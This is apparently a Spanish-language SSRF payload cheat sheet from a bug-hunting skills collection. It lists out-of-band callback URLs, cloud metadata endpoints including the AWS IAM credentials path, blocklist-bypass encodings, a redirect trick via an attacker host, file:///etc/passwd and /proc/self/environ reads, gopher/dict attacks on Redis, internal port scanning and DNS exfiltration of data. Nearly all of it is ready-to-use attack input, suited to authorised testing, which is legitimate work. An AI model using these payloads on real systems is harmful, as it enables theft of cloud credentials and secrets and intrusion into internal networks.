# SSRF Payloads

> Ver `skills/hunt/ssrf` y `skills/core/oob-interactions`. Un callback OOB
> correlacionado por token único es el estándar de prueba para blind SSRF.

## Detección (callback primero)

```
http://{TOKEN}.oast.host/              -- DNS+HTTP; token único por intento
https://{TOKEN}.oast.host/p?x=1        -- HTTPS (algunos fetchers exigen TLS)
```

## Targets internos (una vez confirmado el fetch)

```
http://127.0.0.1/          http://localhost/
http://127.0.0.1:8080/     http://127.0.0.1:6379/   (Redis banner vía CRLF)
http://0.0.0.0/            http://[::1]/
http://169.254.169.254/latest/meta-data/                          -- AWS IMDSv1
http://169.254.169.254/latest/meta-data/iam/security-credentials/ -- credenciales IAM
http://metadata.google.internal/computeMetadata/v1/               -- GCP (requiere header)
http://169.254.169.254/metadata/instance?api-version=2021-02-01   -- Azure (requiere header)
http://100.100.100.200/latest/meta-data/                          -- Alibaba
```

## Bypass de blocklist por encoding

```
http://2130706433/          -- decimal de 127.0.0.1
http://0177.0.0.1/          -- octal
http://0x7f000001/          -- hex
http://127.1/               -- forma corta
http://127.0.0.1.xip.io/  http://169.254.169.254.nip.io/   -- wildcard DNS
http://[::ffff:7f00:1]/     -- IPv6 mapeado
http://⑫⑦。⓪。⓪。①/         -- unicode (parsers laxos)
http://allowed.com@127.0.0.1/          -- userinfo confunde validadores
http://127.0.0.1#allowed.com           -- fragment confunde validadores
```

## Bypass por redirect / DNS rebinding

```
-- En infra propia: endpoint que responde 302 a http://169.254.169.254/...
   curl -s "https://target/fetch?url=http://{attacker}/redir"
-- DNS rebinding: el hostname resuelve primero a IP pública (pasa el check)
   y luego a 127.0.0.1 (fetch real). Requiere servicio rebinder propio.
```

## Esquemas alternativos

```
file:///etc/passwd
file:///proc/self/environ
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_*1%0d%0a...      -- ver gopherus para Redis/MySQL
```

## Blind → impacto (cuando no hay respuesta reflejada)

```
-- Port scan interno vía timing: comparar latencia
   http://10.0.0.5:22 (abierto) vs http://10.0.0.5:31337 (cerrado)
-- Exfil vía DNS cuando solo DNS sale:
   http://$(dato).{TOKEN}.oast.host/   (si el fetcher interpolar comandos — raro)
```

## Gotchas de uso

- Hit DNS-only ≠ fetch HTTP (validadores que solo resuelven). Confirmar el
  request HTTP en el listener.
- IMDSv2 requiere PUT + header — SSRF GET-only no alcanza; documentarlo como
  factor mitigante, no reclamar compromiso de metadata.
- Callbacks desde IPs de scanners de email/WAF (pre-fetch) no son la app —
  verificar remote_addr contra infra del target.
